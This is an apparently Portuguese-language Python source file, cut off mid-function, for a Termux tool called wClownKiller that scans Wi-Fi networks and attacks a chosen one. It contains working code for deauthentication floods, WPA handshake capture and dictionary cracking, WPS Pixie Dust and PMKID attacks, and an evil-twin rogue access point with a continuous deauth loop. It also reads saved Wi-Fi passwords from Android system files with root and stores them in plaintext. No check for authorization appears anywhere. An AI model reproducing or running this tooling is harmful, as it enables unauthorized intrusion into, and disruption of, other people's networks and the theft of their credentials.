#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
wClownKiller v1.0
Advanced Wi-Fi Management & Audit Panel for Termux
Language: Python 3 | Platform: Android/Termux
"""

import os
import sys
import json
import time
import random
import string
import socket
import struct
import hashlib
import subprocess
import threading
import datetime
import re
import signal
from pathlib import Path
from typing import Optional, List, Dict, Tuple

# ─── Dependency bootstrap ────────────────────────────────────────────────────
def _ensure_rich():
    try:
        import rich
    except ImportError:
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'rich', '-q'])
        
_ensure_rich()

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.text import Text
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.live import Live
from rich.columns import Columns
from rich.align import Align
from rich import box
from rich.style import Style
from rich.rule import Rule
from rich.padding import Padding

# ─── Theme ──────────────────────────────────────────────────────────────────
class T:  # Theme constants
    PRIMARY   = "bold red"
    SECONDARY = "red"
    DIM       = "dim red"
    SUCCESS   = "bold green"
    WARNING   = "bold yellow"
    ERROR     = "bold red on black"
    INFO      = "cyan"
    BORDER    = "red"
    BG        = "on black"
    HEADER    = "bold red on black"
    MENU_ITEM = "white"
    MENU_KEY  = "bold red"
    LABEL     = "dim white"
    VALUE     = "white"
    
CONSOLE = Console(
    force_terminal=True,
    color_system="256",
    highlight=False,
    markup=True,
    width=min(os.get_terminal_size().columns if hasattr(os, 'get_terminal_size') else 50, 60)
)

# ─── Paths & Constants ───────────────────────────────────────────────────────
HOME = Path.home()
SAVE_DIR = HOME / ".wclownkiller"
REPORTS_DIR = SAVE_DIR / "reports"
CAPTURES_DIR = SAVE_DIR / "captures"
WORDLIST_DEFAULT = "/sdcard/wordlist.txt"

for d in [SAVE_DIR, REPORTS_DIR, CAPTURES_DIR]:
    d.mkdir(parents=True, exist_ok=True)

# ─── Utility functions ───────────────────────────────────────────────────────
def run(cmd: list, capture=True, timeout=30) -> Tuple[int, str, str]:
    try:
        r = subprocess.run(cmd, capture_output=capture, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except FileNotFoundError:
        return -2, "", f"command not found: {cmd[0]}"
    except Exception as e:
        return -3, "", str(e)

def run_root(cmd: str) -> Tuple[int, str]:
    code, out, err = run(['su', '-c', cmd])
    return code, out if code == 0 else err

def is_root() -> bool:
    return os.geteuid() == 0 if hasattr(os, 'geteuid') else \
           run(['su', '-c', 'id'], capture=True)[1].startswith('uid=0')

def has_cmd(name: str) -> bool:
    return run(['which', name])[0] == 0

def clear():
    os.system('clear')

def pause():
    CONSOLE.print("\n[dim]↵ pressione ENTER[/]")
    input()

def signal_strength_bar(dbm: int, width=10) -> str:
    # dbm typically -30 (excellent) to -90 (terrible)
    pct = max(0, min(100, (dbm + 90) * 100 // 60))
    filled = pct * width // 100
    bar = "█" * filled + "░" * (width - filled)
    color = "green" if pct > 60 else "yellow" if pct > 30 else "red"
    return f"[{color}]{bar}[/] {dbm}dBm"

def security_color(sec: str) -> str:
    s = sec.upper()
    if 'OPEN' in s or s == 'NONE':
        return f"[bold red]{sec}[/]"
    if 'WEP' in s:
        return f"[red]{sec}[/]"
    if 'WPA3' in s:
        return f"[green]{sec}[/]"
    if 'WPA2' in s:
        return f"[yellow]{sec}[/]"
    return f"[white]{sec}[/]"

# ─── Banner ──────────────────────────────────────────────────────────────────
BANNER_ART = """\
[bold red]
  ██╗    ██╗ ██████╗██╗      ██████╗ ██╗    ██╗███╗   ██╗
  ██║    ██║██╔════╝██║     ██╔═══██╗██║    ██║████╗  ██║
  ██║ █╗ ██║██║     ██║     ██║   ██║██║ █╗ ██║██╔██╗ ██║
  ██║███╗██║██║     ██║     ██║   ██║██║███╗██║██║╚██╗██║
  ╚███╔███╔╝╚██████╗███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║
   ╚══╝╚══╝  ╚═════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝[/]
[red] 
  ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
  ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
  █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
  ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
  ██║  ██╗██║███████╗███████╗███████╗██║  ██║
  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝[/]"""
"""

def show_banner():
    CONSOLE.print(BANNER_ART)
    CONSOLE.print(Rule(style="red"))

# ─── Root & Tool Capability Check ────────────────────────────────────────────
class Caps:
    def __init__(self):
        self.root = is_root()
        self.termux_api = has_cmd('termux-wifi-scaninfo')
        self.iw = has_cmd('iw')
        self.aircrack = has_cmd('aircrack-ng')
        self.airodump = has_cmd('airodump-ng')
        self.aireplay = has_cmd('aireplay-ng')
        self.airmon = has_cmd('airmon-ng')
        self.reaver = has_cmd('reaver')
        self.hashcat = has_cmd('hashcat')
        self.hcxtools = has_cmd('hcxdumptool')
        self.scapy = self._check_scapy()
        self.wpa_cli = has_cmd('wpa_cli')
        self.nmap = has_cmd('nmap')
        self.arp = has_cmd('arp')
        self.iface = self._detect_iface()
        
    def _check_scapy(self) -> bool:
        try:
            import scapy
            return True
        except ImportError:
            return False
    
    def _detect_iface(self) -> str:
        for name in ['wlan0', 'wlp2s0', 'wlan1']:
            code, _, _ = run(['ip', 'link', 'show', name])
            if code == 0:
                return name
        return 'wlan0'
    
    def show(self):
        t = Table(box=box.MINIMAL, border_style="red", show_header=False, expand=False)
        t.add_column("Cap", style="dim white")
        t.add_column("Status")
        rows = [
            ("Root", self.root),
            ("Termux API", self.termux_api),
            ("iw", self.iw),
            ("aircrack-ng", self.aircrack),
            ("airodump-ng", self.airodump),
            ("aireplay-ng", self.aireplay),
            ("reaver", self.reaver),
            ("hashcat", self.hashcat),
            ("scapy", self.scapy),
            ("nmap", self.nmap),
        ]
        for name, status in rows:
            icon = "[green]✔[/]" if status else "[red]✘[/]"
            t.add_row(name, icon)
        CONSOLE.print(Panel(t, title="[red]■ Capacidades[/]", border_style="red"))

CAPS = Caps()

# ─── Wi-Fi Scanner ───────────────────────────────────────────────────────────
class WiFiScanner:
    def __init__(self):
        self.last_scan: List[Dict] = []
    
    def scan_termux_api(self) -> List[Dict]:
        """Scan via Termux:API — no root required."""
        code, out, err = run(['termux-wifi-scaninfo'], timeout=15)
        if code != 0 or not out.strip():
            return []
        try:
            raw = json.loads(out)
            nets = []
            for n in raw:
                nets.append({
                    'ssid': n.get('ssid', '<hidden>') or '<hidden>',
                    'bssid': n.get('bssid', '??:??:??:??:??:??').upper(),
                    'signal': n.get('rssi', -99),
                    'freq': n.get('frequency', 0),
                    'channel': self._freq_to_ch(n.get('frequency', 0)),
                    'security': self._parse_caps_termux(n.get('capabilities', '')),
                    'wps': 'WPS' in n.get('capabilities', ''),
                })
            return sorted(nets, key=lambda x: x['signal'], reverse=True)
        except json.JSONDecodeError:
            return []
    
    def scan_iw(self) -> List[Dict]:
        """Scan via iw — may need root on some devices."""
        iface = CAPS.iface
        code, out, err = run(['iw', 'dev', iface, 'scan'], timeout=20)
        if code != 0:
            if CAPS.root:
                _, out = run_root(f'iw dev {iface} scan')
            else:
                return []
        return self._parse_iw_output(out)
    
    def _parse_iw_output(self, raw: str) -> List[Dict]:
        nets = []
        current = {}
        for line in raw.splitlines():
            line = line.strip()
            if line.startswith('BSS '):
                if current.get('bssid'):
                    nets.append(current)
                bssid = line.split(' ')[1].split('(')[0].strip().upper()
                current = {'bssid': bssid, 'ssid': '<hidden>', 'signal': -99,
                           'channel': 0, 'freq': 0, 'security': 'OPEN', 'wps': False}
            elif 'SSID:' in line:
                current['ssid'] = line.split(':', 1)[1].strip() or '<hidden>'
            elif 'signal:' in line:
                try:
                    current['signal'] = int(float(line.split(':')[1].split()[0]))
                except:
                    pass
            elif 'freq:' in line.lower() or 'primary channel:' in line.lower():
                try:
                    current['channel'] = int(line.split(':')[1].strip())
                except:
                    pass
            elif 'WPS:' in line:
                current['wps'] = True
            elif 'capability:' in line.lower():
                caps = line.lower()
                if 'rsn' in caps or 'wpa2' in caps:
                    current['security'] = 'WPA2'
                elif 'wpa' in caps:
                    current['security'] = 'WPA'
                elif 'wep' in caps:
                    current['security'] = 'WEP'
                else:
                    current['security'] = 'OPEN'
        if current.get('bssid'):
            nets.append(current)
        return sorted(nets, key=lambda x: x['signal'], reverse=True)
    
    def _parse_caps_termux(self, caps: str) -> str:
        c = caps.upper()
        if 'WPA3' in c:
            return 'WPA3'
        if 'WPA2' in c or 'RSN' in c:
            return 'WPA2'
        if 'WPA' in c:
            return 'WPA'
        if 'WEP' in c:
            return 'WEP'
        return 'OPEN'
    
    def _freq_to_ch(self, freq: int) -> int:
        if freq == 0:
            return 0
        if 2412 <= freq <= 2484:
            return (freq - 2407) // 5
        if 5180 <= freq <= 5825:
            return (freq - 5000) // 5
        return 0
    
    def scan_and_display(self):
        CONSOLE.print()
        with CONSOLE.status("[red]■ Scanning...[/]", spinner="dots", spinner_style="red"):
            # Try termux-api first, fallback to iw
            nets = self.scan_termux_api()
            if not nets:
                nets = self.scan_iw()
        
        if not nets:
            CONSOLE.print("[red]✘ Nenhuma rede encontrada.[/]")
            CONSOLE.print("[dim]Instale Termux:API ou dê permissão root.[/]")
            return
        
        self.last_scan = nets
        self._render_table(nets)
    
    def _render_table(self, nets: List[Dict]):
        t = Table(
            box=box.MINIMAL_DOUBLE_HEAD,
            border_style="red",
            header_style="bold red",
            expand=True,
            show_lines=False
        )
        t.add_column("#", style="dim red", width=3, no_wrap=True)
        t.add_column("SSID", style="white", max_width=16, no_wrap=True)
        t.add_column("Signal", no_wrap=True, min_width=8)
        t.add_column("Sec", style="yellow", width=6, no_wrap=True)
        t.add_column("CH", style="dim white", width=4, no_wrap=True)
        t.add_column("WPS", width=4, no_wrap=True)
        
        for i, n in enumerate(nets, 1):
            wps = "[red]●[/]" if n['wps'] else "[dim]·[/]"
            sig = signal_strength_bar(n['signal'], width=6)
            t.add_row(
                str(i),
                n['ssid'][:15],
                sig,
                security_color(n['security']),
                str(n['channel']),
                wps
            )
        
        CONSOLE.print(Panel(t, title=f"[red]■ {len(nets)} redes detectadas[/]", border_style="red"))
    
    def select_target(self) -> Optional[Dict]:
        if not self.last_scan:
            self.scan_and_display()
        if not self.last_scan:
            return None
        self._render_table(self.last_scan)
        CONSOLE.print()
        try:
            idx = IntPrompt.ask("[red]■[/] Selecione rede [dim](1-{len})[/]".replace("{len}", str(len(self.last_scan))))
            if 1 <= idx <= len(self.last_scan):
                return self.last_scan[idx - 1]
        except (ValueError, KeyboardInterrupt):
            pass
        return None

# ─── Attack Engine ───────────────────────────────────────────────────────────
class AttackEngine:
    def __init__(self, scanner: WiFiScanner):
        self.scanner = scanner
        self.mon_iface = CAPS.iface + 'mon'
    
    def _require_root(self) -> bool:
        if not CAPS.root:
            CONSOLE.print("[red]✘ Root necessário para ataques.[/]")
            CONSOLE.print("[dim]Execute: [red]su[/] antes de iniciar.[/]")
            return False
        return True
    
    def enable_monitor_mode(self) -> bool:
        if not self._require_root():
            return False
        CONSOLE.print(f"[dim]■ Ativando modo monitor em {CAPS.iface}...[/]")
        
        if CAPS.airmon:
            run(['airmon-ng', 'check', 'kill'])
            code, out, _ = run(['airmon-ng', 'start', CAPS.iface])
            # airmon-ng might rename to wlan0mon
            for line in out.splitlines():
                if 'monitor mode' in line.lower() and 'on' in line.lower():
                    m = re.search(r'\((.+?)\)', line)
                    if m:
                        self.mon_iface = m.group(1)
            CONSOLE.print(f"[green]✔ Monitor: {self.mon_iface}[/]")
            return True
        else:
            # Manual via ip/iw
            run_root(f'ip link set {CAPS.iface} down')
            run_root(f'iw {CAPS.iface} set monitor control')
            run_root(f'ip link set {CAPS.iface} up')
            self.mon_iface = CAPS.iface
            CONSOLE.print(f"[green]✔ Monitor manual: {self.mon_iface}[/]")
            return True
    
    def disable_monitor_mode(self):
        if CAPS.airmon:
            run(['airmon-ng', 'stop', self.mon_iface])
        else:
            run_root(f'ip link set {CAPS.iface} down')
            run_root(f'iw {CAPS.iface} set type managed')
            run_root(f'ip link set {CAPS.iface} up')
        CONSOLE.print("[dim]■ Modo managed restaurado[/]")
    
    # ── Deauth Flood ──────────────────────────────────────────────────────────
    def deauth_attack(self, target: Dict, client_mac='FF:FF:FF:FF:FF:FF', count=0):
        """
        Deauth flood via aireplay-ng or scapy.
        count=0 → continuous until Ctrl+C
        """
        if not self.enable_monitor_mode():
            return
        
        bssid = target['bssid']
        channel = target['channel']
        
        CONSOLE.print(Panel(
            f"[red]TARGET:[/] {target['ssid']}\n"
            f"[red]BSSID:[/]  {bssid}\n"
            f"[red]CH:[/]     {channel}\n"
            f"[red]CLIENT:[/] {client_mac}\n"
            f"[dim]Ctrl+C para parar[/]",
            title="[red]■ DEAUTH FLOOD[/]", border_style="red"
        ))
        
        if CAPS.aireplay:
            self._deauth_aireplay(bssid, channel, client_mac, count)
        elif CAPS.scapy:
            self._deauth_scapy(bssid, client_mac, count)
        else:
            CONSOLE.print("[red]✘ Precisa: aireplay-ng ou scapy[/]")
            CONSOLE.print("[dim]pkg install aircrack-ng[/]")
        
        self.disable_monitor_mode()
    
    def _deauth_aireplay(self, bssid: str, channel: int, client: str, count: int):
        # Set channel first
        run_root(f'iw dev {self.mon_iface} set channel {channel}')
        c_flag = str(count) if count > 0 else '0'
        cmd = ['aireplay-ng', '--deauth', c_flag, '-a', bssid, '-c', client, self.mon_iface]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            with CONSOLE.status("[red]■ Deauth packets flying...[/]", spinner="dots"):
                for line in proc.stdout:
                    if 'ACK' in line or 'Sending' in line or 'DeAuth' in line:
                        CONSOLE.print(f"[dim red]{line.strip()}[/]")
        except KeyboardInterrupt:
            proc.terminate()
            CONSOLE.print("\n[dim]■ Interrompido.[/]")
    
    def _deauth_scapy(self, bssid: str, client: str, count: int):
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            pkt = (RadioTap() /
                   Dot11(addr1=client, addr2=bssid, addr3=bssid) /
                   Dot11Deauth(reason=7))
            sent = 0
            CONSOLE.print("[dim]■ Enviando deauth via scapy...[/]")
            try:
                while count == 0 or sent < count:
                    sendp(pkt, iface=self.mon_iface, count=1, inter=0.05, verbose=0)
                    sent += 1
                    if sent % 50 == 0:
                        CONSOLE.print(f"[dim red]  → {sent} pacotes enviados[/]")
            except KeyboardInterrupt:
                CONSOLE.print(f"\n[dim]■ Parado. Total: {sent} pacotes[/]")
        except ImportError:
            CONSOLE.print("[red]✘ scapy não instalado[/]")
    
    # ── Handshake Capture ─────────────────────────────────────────────────────
    def capture_handshake(self, target: Dict) -> Optional[str]:
        if not self.enable_monitor_mode():
            return None
        if not CAPS.airodump:
            CONSOLE.print("[red]✘ airodump-ng necessário[/]")
            self.disable_monitor_mode()
            return None
        
        bssid = target['bssid']
        ssid_safe = re.sub(r'[^\w]', '_', target['ssid'])
        channel = target['channel']
        cap_prefix = str(CAPTURES_DIR / ssid_safe)
        
        CONSOLE.print(Panel(
            f"[red]TARGET:[/] {target['ssid']}\n"
            f"[red]BSSID:[/]  {bssid}\n"
            f"[red]CH:[/]     {channel}\n"
            f"[red]OUT:[/]    {cap_prefix}-01.cap",
            title="[red]■ CAPTURA DE HANDSHAKE[/]", border_style="red"
        ))
        
        # Set channel
        run_root(f'iw dev {self.mon_iface} set channel {channel}')
        
        # Start airodump
        dump_cmd = [
            'airodump-ng', '--bssid', bssid, '-c', str(channel),
            '-w', cap_prefix, '--output-format', 'pcap', self.mon_iface
        ]
        dump_proc = subprocess.Popen(
            dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        # Aggressive mode: also deauth clients to force handshake
        if CAPS.aireplay:
            time.sleep(3)
            CONSOLE.print("[dim]■ Enviando deauth para forçar handshake...[/]")
            for _ in range(3):
                run([
                    'aireplay-ng', '--deauth', '5',
                    '-a', bssid, self.mon_iface
                ])
                time.sleep(2)
        
        # Wait and check for handshake
        cap_file = cap_prefix + '-01.cap'
        found = False
        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[red]■ Aguardando handshake...[/]"),
            TimeElapsedColumn(),
            console=CONSOLE
        ) as progress:
            task = progress.add_task("", total=None)
            start = time.time()
            while time.time() - start < 120:  # 2 min timeout
                time.sleep(5)
                if Path(cap_file).exists():
                    # Quick check with aircrack
                    code, out, _ = run(['aircrack-ng', cap_file])
                    if 'handshake' in out.lower() or '1 handshake' in out.lower():
                        found = True
                        break
        
        dump_proc.terminate()
        self.disable_monitor_mode()
        
        if found:
            CONSOLE.print(f"[green]✔ Handshake capturado: {cap_file}[/]")
            return cap_file
        elif Path(cap_file).exists():
            CONSOLE.print(f"[yellow]? Arquivo salvo (handshake não confirmado): {cap_file}[/]")
            return cap_file
        else:
            CONSOLE.print("[red]✘ Handshake não capturado[/]")
            return None
    
    # ── Crack Handshake ───────────────────────────────────────────────────────
    def crack_handshake(self, cap_file: str, wordlist: Optional[str] = None):
        if not wordlist:
            wordlist = WORDLIST_DEFAULT
        if not Path(wordlist).exists():
            CONSOLE.print(f"[red]✘ Wordlist não encontrada: {wordlist}[/]")
            wl_in = Prompt.ask("[red]■[/] Caminho da wordlist", default="/sdcard/wordlist.txt")
            wordlist = wl_in
            if not Path(wordlist).exists():
                CONSOLE.print("[red]✘ Wordlist inexistente. Abortando.[/]")
                return
        
        CONSOLE.print(Panel(
            f"[red]CAP:[/] {cap_file}\n[red]WL:[/]  {wordlist}",
            title="[red]■ CRACK WPA[/]", border_style="red"
        ))
        
        if CAPS.hashcat:
            self._crack_hashcat(cap_file, wordlist)
        elif CAPS.aircrack:
            self._crack_aircrack(cap_file, wordlist)
        else:
            CONSOLE.print("[red]✘ Precisa: aircrack-ng ou hashcat[/]")
    
    def _crack_aircrack(self, cap_file: str, wordlist: str):
        cmd = ['aircrack-ng', '-w', wordlist, cap_file]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            CONSOLE.print("[dim]■ Iniciando aircrack-ng...[/]")
            for line in proc.stdout:
                line = line.strip()
                if 'KEY FOUND' in line.upper():
                    CONSOLE.print(f"[bold green]■ {line}[/]")
                elif 'keys tested' in line.lower() or 'Passphrase' in line:
                    CONSOLE.print(f"[dim red]{line}[/]")
        except KeyboardInterrupt:
            proc.terminate()
            CONSOLE.print("\n[dim]■ Interrompido.[/]")
    
    def _crack_hashcat(self, cap_file: str, wordlist: str):
        # Convert cap to hccapx first
        hccapx = cap_file.replace('.cap', '.hccapx')
        run(['cap2hccapx', cap_file, hccapx])
        if not Path(hccapx).exists():
            # Try hcxtools
            run(['hcxpcaptool', '-z', hccapx, cap_file])
        if not Path(hccapx).exists():
            CONSOLE.print("[red]✘ Conversão de cap falhou[/]")
            return
        cmd = ['hashcat', '-m', '2500', hccapx, wordlist, '--status', '--status-timer=5']
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            CONSOLE.print("[dim]■ Iniciando hashcat...[/]")
            for line in proc.stdout:
                line = line.strip()
                if line:
                    CONSOLE.print(f"[dim red]{line}[/]")
        except KeyboardInterrupt:
            proc.terminate()
            CONSOLE.print("\n[dim]■ Interrompido.[/]")
    
    # ── WPS Pixie Dust Attack ─────────────────────────────────────────────────
    def wps_pixie_attack(self, target: Dict):
        if not self.enable_monitor_mode():
            return
        if not CAPS.reaver:
            CONSOLE.print("[red]✘ reaver necessário[/]")
            CONSOLE.print("[dim]pkg install reaver[/]")
            self.disable_monitor_mode()
            return
        if not target['wps']:
            CONSOLE.print("[yellow]⚠ Esta rede pode não ter WPS ativo[/]")
        
        bssid = target['bssid']
        channel = target['channel']
        
        CONSOLE.print(Panel(
            f"[red]TARGET:[/] {target['ssid']}\n"
            f"[red]BSSID:[/]  {bssid}\n[red]CH:[/]     {channel}\n"
            f"[dim]Ataque Pixie Dust — extrai PIN WPS[/]",
            title="[red]■ WPS PIXIE DUST[/]", border_style="red"
        ))
        
        cmd = [
            'reaver', '-i', self.mon_iface, '-b', bssid,
            '-c', str(channel), '-vv', '-K', '1', '-N'
        ]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout:
                line = line.strip()
                if any(k in line for k in ['WPS PIN', 'WPA PSK', 'PIN', 'PSK', 'Found']):
                    CONSOLE.print(f"[bold green]■ {line}[/]")
                elif line:
                    CONSOLE.print(f"[dim red]{line}[/]")
        except KeyboardInterrupt:
            proc.terminate()
            CONSOLE.print("\n[dim]■ Interrompido.[/]")
        
        self.disable_monitor_mode()
    
    # ── PMKID Attack ──────────────────────────────────────────────────────────
    def pmkid_attack(self, target: Dict, wordlist: Optional[str] = None):
        if not self.enable_monitor_mode():
            return
        if not CAPS.hcxtools:
            CONSOLE.print("[red]✘ hcxdumptool necessário[/]")
            self.disable_monitor_mode()
            return
        
        bssid_clean = target['bssid'].replace(':', '').lower()
        pmkid_file = str(CAPTURES_DIR / f"{bssid_clean}.pmkid")
        bssid_file = str(CAPTURES_DIR / f"{bssid_clean}.txt")
        
        # Write target bssid
        Path(bssid_file).write_text(target['bssid'].replace(':', '').lower())
        
        CONSOLE.print(Panel(
            f"[red]TARGET:[/] {target['ssid']}\n[red]BSSID:[/]  {target['bssid']}\n"
            f"[dim]Ataque PMKID — sem clientes necessários[/]",
            title="[red]■ PMKID ATTACK[/]", border_style="red"
        ))
        
        cmd = [
            'hcxdumptool', '-i', self.mon_iface,
            '--filterlist_ap=' + bssid_file,
            '--filtermode=2',
            '-o', pmkid_file + '.pcapng',
            '--enable_status=1'
        ]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            CONSOLE.print("[dim]■ Coletando PMKID...[/]")
            start = time.time()
            for line in proc.stdout:
                CONSOLE.print(f"[dim red]{line.strip()}[/]")
                if 'PMKID' in line and time.time() - start > 30:
                    break
        except KeyboardInterrupt:
            proc.terminate()
        
        proc.terminate()
        self.disable_monitor_mode()
        
        # Extract PMKID
        hash_file = pmkid_file + '.hash'
        run(['hcxpcapngtool', '-z', hash_file, pmkid_file + '.pcapng'])
        
        if Path(hash_file).exists() and Path(hash_file).stat().st_size > 0:
            CONSOLE.print(f"[green]✔ PMKID extraído: {hash_file}[/]")
            if wordlist or Path(WORDLIST_DEFAULT).exists():
                wl = wordlist or WORDLIST_DEFAULT
                cmd_crack = ['hashcat', '-m', '22000', hash_file, wl, '--status']
                try:
                    proc = subprocess.Popen(cmd_crack, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    for line in proc.stdout:
                        line = line.strip()
                        if line:
                            CONSOLE.print(f"[dim red]{line}[/]")
                except KeyboardInterrupt:
                    proc.terminate()
        else:
            CONSOLE.print("[red]✘ PMKID não coletado[/]")
    
    # ── Evil Twin AP ──────────────────────────────────────────────────────────
    def evil_twin(self, target: Dict):
        """Create a rogue AP mimicking the target, capture credentials."""
        if not self._require_root():
            return
        if not has_cmd('hostapd'):
            CONSOLE.print("[red]✘ hostapd necessário[/]")
            CONSOLE.print("[dim]pkg install hostapd[/]")
            return
        
        bssid = target['bssid']
        ssid = target['ssid']
        channel = target['channel']
        iface = CAPS.iface
        
        # Write hostapd config
        hostapd_conf = f"""\
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
        conf_path = str(SAVE_DIR / 'evil_twin.conf')
        Path(conf_path).write_text(hostapd_conf)
        
        CONSOLE.print(Panel(
            f"[red]EVIL TWIN:[/] {ssid}\n"
            f"[red]CH:[/] {channel} | [red]IFACE:[/] {iface}\n"
            f"[dim]Clientes conectando ao twin terão tráfego interceptável[/]",
            title="[red]■ EVIL TWIN AP[/]", border_style="red"
        ))
        
        # Also send deauths to push clients off real AP
        deauth_thread = None
        if CAPS.aireplay:
            def _deauth_loop():
                while True:
                    run(['aireplay-ng', '--deauth', '5', '-a', bssid, CAPS.iface])
                    time.sleep(5)
            deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
            deauth_thread.start()
            CONSOLE.print("[dim]■ Deauth loop iniciado em paralelo[/]")
        
        try:
            proc = subprocess.Popen(
                ['hostapd', conf_path],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            CONSOLE.print("[dim]Ctrl+C para parar[/]")
            for line in proc.stdout:
                line = line.strip()
                if 'station' in line.lower() or 'connect' in line.lower() or 'assoc' in line.lower():
                    CONSOLE.print(f"[bold green]■ {line}[/]")
                elif line:
                    CONSOLE.print(f"[dim red]{line}[/]")
        except KeyboardInterrupt:
            proc.terminate()
            CONSOLE.print("\n[dim]■ Evil Twin parado.[/]")
    
    # ── Invasion Menu ─────────────────────────────────────────────────────────
    def invasion_menu(self):
        target = self.scanner.select_target()
        if not target:
            return
        
        while True:
            CONSOLE.print()
            CONSOLE.print(Panel(
                f"[red]ALVO:[/] {target['ssid']}  [red]|[/]  {target['bssid']}\n"
                f"[red]SEC:[/] {target['security']}  [red]|[/]  WPS: {'SIM' if target['wps'] else 'NÃO'}",
                border_style="red"
            ))
            CONSOLE.print("[bold red]■ MÉTODO DE INVASÃO[/]")
            CONSOLE.print("[red]1[/] WPS Pixie Dust")
            CONSOLE.print("[red]2[/] Capturar + Crackear Handshake WPA")
            CONSOLE.print("[red]3[/] Ataque PMKID (sem clientes)")
            CONSOLE.print("[red]4[/] Deauth flood")
            CONSOLE.print("[red]5[/] Evil Twin AP")
            CONSOLE.print("[red]0[/] Voltar")
            CONSOLE.print()
            choice = Prompt.ask("[red]■[/] Escolha", default="0")
            
            if choice == '1':
                self.wps_pixie_attack(target)
            elif choice == '2':
                cap = self.capture_handshake(target)
                if cap:
                    if Confirm.ask("[red]■[/] Crackear agora?", default=True):
                        self.crack_handshake(cap)
            elif choice == '3':
                self.pmkid_attack(target)
            elif choice == '4':
                self.deauth_attack(target)
            elif choice == '5':
                self.evil_twin(target)
            elif choice == '0':
                break
            
            if choice != '0':
                pause()

# ─── Password Manager ────────────────────────────────────────────────────────
class PasswordManager:
    def __init__(self):
        self.saved_passwords: Dict[str, str] = self._load_saved()
    
    def _load_saved(self) -> Dict[str, str]:
        p = SAVE_DIR / 'passwords.json'
        if p.exists():
            try:
                return json.loads(p.read_text())
            except:
                pass
        return {}
    
    def _save(self):
        p = SAVE_DIR / 'passwords.json'
        p.write_text(json.dumps(self.saved_passwords, indent=2))
    
    def get_root_stored_passwords(self) -> List[Dict]:
        """Read Android system Wi-Fi passwords (root required)."""
        if not CAPS.root:
            CONSOLE.print("[red]✘ Root necessário para ler senhas do sistema[/]")
            return []
        
        results = []
        # Android 10+ path
        paths = [
            '/data/misc/wifi/WifiConfigStore.xml',
            '/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml',
            '/data/misc/wifi/wpa_supplicant.conf',
        ]
        
        for path in paths:
            code, content = run_root(f'cat "{path}"')
            if code != 0 or not content:
                continue
            
            if path.endswith('.xml'):
                results.extend(self._parse_xml_config(content))
            elif path.endswith('.conf'):
                results.extend(self._parse_wpa_conf(content))
        
        return results
    
    def _parse_xml_config(self, xml: str) -> List[Dict]:
        """Parse WifiConfigStore.xml for SSIDs and PSKs."""
        nets = []
        # Match NetworkConfiguration blocks
        ssid_pattern = re.compile(r'<string name="SSID"[^>]*>"([^"]*)"</string>')
        psk_pattern = re.compile(r'<string name="PreSharedKey"[^>]*>"([^"]*)"</string>')
        # Zip them naively — same order
        ssids = ssid_pattern.findall(xml)
        psks = psk_pattern.findall(xml)
        for ssid, psk in zip(ssids, psks):
            nets.append({'ssid': ssid, 'password': psk, 'source': 'system'})
        # Also try SecurityType for open networks
        return nets
    
    def _parse_wpa_conf(self, conf: str) -> List[Dict]:
        """Parse wpa_supplicant.conf."""
        nets = []
        current = {}
        for line in conf.splitlines():
            line = line.strip()
            if line == 'network={':
                current = {}
            elif line == '}':
                if 'ssid' in current:
                    nets.append({
                        'ssid': current.get('ssid', '').strip('"'),
                        'password': current.get('psk', current.get('wep_key0', 'N/A')).strip('"'),
                        'source': 'wpa_supplicant'
                    })
                current = {}
            elif '=' in line and not line.startswith('#'):
                k, v = line.split('=', 1)
                current[k.strip()] = v.strip()
        return nets
    
    def display_root_passwords(self):
        """Show all stored Wi-Fi passwords."""
        with CONSOLE.status("[red]■ Lendo senhas do sistema...[/]", spinner_style="red"):
            nets = self.get_root_stored_passwords()
        
        if not nets:
            CONSOLE.print("[yellow]■ Nenhuma senha encontrada no sistema[/]")
            if not CAPS.root:
                CONSOLE.print("[dim]Root necessário para acessar senhas do sistema[/]")
            return
        
        t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style="red", header_style="bold red", expand=True)
        t.add_column("SSID", style="white")
        t.add_column("Senha", style="bold red")
        t.add_column("Fonte", style="dim")
        
        for n in nets:
            t.add_row(n['ssid'], n['password'], n['source'])
            self.saved_passwords[n['ssid']] = n['password']
        
        self._save()
        CONSOLE.print(Panel(t, title="[red]■ Senhas Wi-Fi Armazenadas[/]", border_style="red"))
    
    def display_saved_passwords(self):
        """Show our internal saved passwords db."""
        if not self.saved_passwords:
            CONSOLE.print("[dim]■ Sem senhas salvas[/]")
            return
        
        t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style="red", header_style="bold red", expand=True)
        t.add_column("SSID", style="white")
        t.add_column("Senha", style="bold red")
        
